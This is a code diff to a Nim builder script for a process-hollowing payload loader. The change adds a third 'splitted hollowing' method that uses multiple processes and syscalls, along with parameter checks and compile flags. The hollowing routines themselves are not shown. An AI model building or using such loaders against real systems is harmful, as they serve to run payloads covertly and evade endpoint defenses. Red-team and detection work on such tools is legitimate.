@@ -87,6 +87,7 @@ when isMainModule:
 
         1 - Simple hollowing
         2 - Syscalls hollowing (using NimlineWhispers2)
+        3 - Splitted hollowing using multiple processes and syscalls
         """)
         option("-s", "--sponsor", help="Sponsor path to hollow (default: self hollowing)")
         option("-a", "--args", help="Command line arguments to append to the hollowed process")
@@ -132,7 +133,12 @@ when isMainModule:
     if peImageMagic != 523 or not pePath.endsWith(".exe"):
         echo "[-] Payload is not a valid x64 exe format"
         quit(1)
-      
+
+    # Validate params
+    if injectionMethod == "3" and outFormat == "dll":
+        echo "[-] Injection method 3 isn't compatible with dll format"
+        quit(1)
+
     # Compress & encode exe payload
     var compressedPe = compress(peStr)
     var compressedBase64PE = encode(compressedPe)
@@ -162,12 +168,19 @@ var sleepSeconds* = {sleepSeconds}
         compileFlags.add(" -d:hollowsimple")
     elif injectionMethod == "2":
         compileFlags.add(" -d:hollownimline")
+    elif injectionMethod == "3":
+        compileFlags.add(" -d:hollowsplitted")
+    else:
+        echo "[-] Injection method doesn't exist :("
+        quit(1)
+        
+    if injectionMethod in ["2", "3"]:        
         #[ 
         Loader crashes when using NimlineWhispers2 as release compilation
         Should be compiled as debug or as release with --stacktrace:on --linetrace:on
         TODO - open issue
         ]#
-        compileFlags.add(" --stacktrace:on --linetrace:on") 
+        compileFlags.add(" --stacktrace:on --linetrace:on")
 
     # Change to debug if needed
     if isDebug:
@@ -196,6 +209,8 @@ proc {outDllExportName}(): void {{.stdcall, exportc, dynlib.}} =
     var res = execCmdEx(compileCmd, options={poStdErrToStdOut})
     if res[1] == 0:
         echo "[+] Compiled successfully"
+        if injectionMethod == "3":
+            echo "[i] Run the hollower with -M argument"
     else:
         echo "[-] Error compiling. compilation output:"
         echo res[0]
